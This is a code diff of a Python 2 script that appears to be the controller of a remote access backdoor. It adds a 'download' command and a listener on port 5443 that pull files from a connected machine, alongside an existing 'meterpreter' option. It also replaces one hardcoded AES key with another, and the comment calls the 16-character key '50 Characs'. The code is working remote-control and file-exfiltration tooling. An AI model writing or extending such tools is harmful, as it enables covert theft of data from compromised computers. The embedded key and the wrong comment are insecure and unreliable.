@@ -173,10 +173,34 @@ def sent(ip, aes, fileName):
     print "Done Sending"
     s.close()
 
+#Receive File Method
+def receive(aes, fileName):
+    # Create a TCP/IP socket
+    sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    # Bind the socket to the address given on the command line
+    server_address2 = ('', 5443)
+    sock2.bind(server_address2)
+    sock2.listen(5)
+    con2, client_address2 = sock2.accept()
+        
+    f = open(fileName,'wb')
+    print f
+    #con.listen(5)                 # Now wait for client connection.
+    print "Receiving..."
+    l = con2.recv(1024)
+    while (l):
+        print "Receiving..."
+        f.write(l)
+        l = con2.recv(1024)
+    f.close()
+    con2.close()                # Close the connection
+    print "Done Receiving"
+
 
 def main():
     #CipherAES Object
-    aes = AESCipher( 'mysecretpassword') #16 Characs
+    aes = AESCipher( 'yibEejptfvGvuidg') #50 Characs
     # Create a TCP/IP socket
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -209,6 +233,13 @@ def main():
                         fileDest = raw_input(req_str)
                         req_str = option(con, aes, fileDest)
                         sent(con.getpeername()[0], aes, fileName)
+                        cmd = 'ok'
+                    if cmd == 'download':
+                        req_str = option(con, aes, cmd)
+                        fileName = raw_input("¿Cual es el nombre del fichero (indique ext): ")
+                        fileDest = raw_input(req_str)
+                        req_str = option(con, aes, fileName)
+                        receive(aes, fileDest)
                         cmd = 'ok'
                     if code == "1" and cmd == "meterpreter":
                         cmd = meterpreter()
